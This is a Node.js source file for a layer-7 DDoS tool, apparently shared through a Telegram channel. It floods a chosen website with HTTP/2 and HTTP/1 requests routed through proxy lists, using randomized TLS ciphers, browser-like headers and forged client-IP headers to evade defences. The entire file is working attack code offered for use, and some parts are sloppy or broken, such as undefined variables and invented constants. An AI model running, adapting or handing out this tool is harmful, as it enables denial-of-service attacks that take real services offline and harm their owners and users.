 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 var path = require("path");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const osUtils = require('os-utils');
 const axios = require('axios');
 const https = require('https');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 if (process.argv.length < 7){console.log(`
 
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
           
Usage: node HTTP-X.js Target Time Rate Thread ProxyFile
Example: node HTTP-X.js https://target.com 120 32 8 proxy.txt

Xyrin
`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randstrs(length) {
    const characters = "0123456789abcdefghijklmnopkrstuvyzx";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
 }

 const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };

  const targetURL = process.argv[2];
  const agent = new https.Agent({ rejectUnauthorized: false });

  function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Request Timed Out'));
    }, 5000);
  });

  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`${getCurrentTime()} [HTTP-X]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [HTTP-X]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [HTTP-X]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [HTTP-X]  ${error.message}`);
      }
    });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function getRandomNumberBetween(min,max){
     return Math.floor(Math.random()*(max-min+1)+min);
 }

 function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
}

if (cluster.isMaster){
  console.clear();
  console.log(`
 
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
                        Press Ctrl+Z To Stop DDoS
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [HTTP-X]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [HTTP-X]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [HTTP-X]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 

const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
];

const sigalgs = [
 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
 'ecdsa_brainpoolP256r1tls13_sha256',
 'ecdsa_brainpoolP384r1tls13_sha384',
 'ecdsa_brainpoolP512r1tls13_sha512',
 'ecdsa_sha1',
 'ed25519',
 'ed448',
 'ecdsa_sha224',
 'rsa_pkcs1_sha1',
 'rsa_pss_pss_sha256',
 'dsa_sha256',
 'dsa_sha384',
 'dsa_sha512',
 'dsa_sha224',
 'dsa_sha1',
 'rsa_pss_pss_sha384',
 'rsa_pkcs1_sha2240',
 'rsa_pss_pss_sha512',
 'sm2sig_sm3',
 'ecdsa_secp521r1_sha512',
];

const pathts = [
  "login",
  "home",
  "register",
  "new",
  "jawa"
];

let concu = sigalgs.join(':');
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 0; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
    cluster.fork();
  });
    
    setInterval(() => {
        osUtils.cpuUsage((usage) => {
            console.log(`CPU Usage: ${usage * 100}%`);
            if (usage >= 1) {
                console.log('CPU usage is 100%, restarting...');
                for (const id in cluster.workers) {
                    cluster.workers[id].process.kill();
                }
            }
        });
    }, 30000);

} if (args.target.startsWith("http") || args.target.startsWith === "zetvideo.net") {
    http1fld();
    console.log("HTTP1 JAWAHYTAM1337");
} else {
    setInterval(runFlooder, 1);
}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

function acheaders() {
    const mediaTypes = [
        'text/html',
        'application/xhtml+xml',
        'application/xml',
        'image/webp',
        'image/apng',
        'application/signed-exchange;v=b3',
        'application/json',
        'application/pdf',
        'image/avif',
        'image/jpeg',
        'image/png',
        'image/svg+xml',
        'text/plain',
        'text/css',
        'text/javascript',
        'application/javascript',
        'application/atom+xml',
        'application/rss+xml',
    ];

    const randomTypes = mediaTypes.sort(() => 0.5 - Math.random()).slice(0, Math.floor(Math.random() * mediaTypes.length) + 1);

    const weightedTypes = randomTypes.map((type, index) => {
        const quality = (1 - (index / randomTypes.length)).toFixed(1);
        return `${type};q=${quality}`;
    });
    
    return weightedTypes.join(', ');
}

function generatestfu() {
    const browsers = [
        { name: "Chromium", version: "112" },
        { name: "Google Chrome", version: "112" },
        { name: "Microsoft Edge", version: "112" },
        { name: "Firefox", version: "110" },
        { name: "Safari", version: "15" },
    ];

    const platforms = ["Windows", "macOS", "Linux", "Android", "iOS"];

    const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    const randomPlatform = platforms[Math.floor(Math.random() * platforms.length)];

    const versionSubversion = `${randomBrowser.version}.${Math.floor(Math.random() * 1000)}`;

    const secCHUA = `\"${randomBrowser.name}\";v=\"${versionSubversion}\", \"Not:A-Brand\";v=\"99\", \"${randomPlatform}\";v=\"1\"`;

    return secCHUA;
}

function ipgen() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];

    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];

    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);

        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }

    return ipPrefix.join(".");
}

const moretrash = [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA',
        'en-UK, en, de;q=0.5',
        'en-NZ',
        'en-GB,en;q=0.6',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-HK',
        'en-GB,en;q=0.8',
        'en-GB,en;q=0.9',
        'en-GB,en;q=0.7',
  ];

 const Socker = new NetSocket();
 
 headers[":method"] = randomElement(["GET", "POST"]);;
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = acheaders();
 headers["accept-language"] = randomElement(moretrash);
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
 headers["DNT"] = randomElement(["1", "0"]);
 headers["sec-ch-ua"] = generatestfu();
 headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
 headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
 headers["referer"] = parsedTarget + randomElement(pathts);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "same-origin";
 headers["sec-ch-ua-arch"] = "x86";
 headers["sec-ch-ua-bitness"] = "64";
 headers["user-agent"] = randomUseragent.getRandom();
 headers["x-forwarded-proto"] = "https";
 headers["upgrade-insecure-requests"] = "1";
 
 function http1fld(){
    var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, parsedTarget.host);
    s.setTimeout(10000);
    for (var i = 0; i < 64; i++) {
        s.write('GET ' + args.target + ' HTTP/1.2\r\nHost: ' + parsedTarget.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: JAWAHYTAMLEGAM1337 \r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
    setTimeout(() => clearInterval(int), time * 1000);
}
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const payload = randstrs(25);
     
     //Extra For JawaHytam1337
        headers["X-Real-Client-IP"] = ipgen();
        headers["X-Real-IP"] = ipgen();
        headers["X-Remote-Addr"] = ipgen();
        headers["X-Remote-IP"] = ipgen();
        headers["X-Forwarder"] = ipgen();
        headers["X-Forwarder-For"] = ipgen();
        headers["X-Forwarder-Host"] = ipgen();
        headers["X-Forwarding"] = ipgen();
        headers["X-Forwarding-For"] = ipgen();
        headers["Forwarded"] = ipgen();
        headers["Forwarded-For"] = ipgen();
        headers["Forwarded-Host"] = ipgen();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 25
     };

    setTimeout(function(){
      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 100000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 1000);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxDeflateDynamicTableSize: 4294967295,
             maxSettings: 4294967295,
             maxSessionMemory: 4294967295,
             maxHeaderListPairs: 4294967295,
             maxOutstandingPings: 4294967295,
             maxReservedRemoteStreams: 4294967295,
             maxSendHeaderBlockLength: 4294967295,
             peerMaxConcurrentStreams: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    request.write(payload);
                    request.close();
                    request.end();
                }
            }, 100); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }


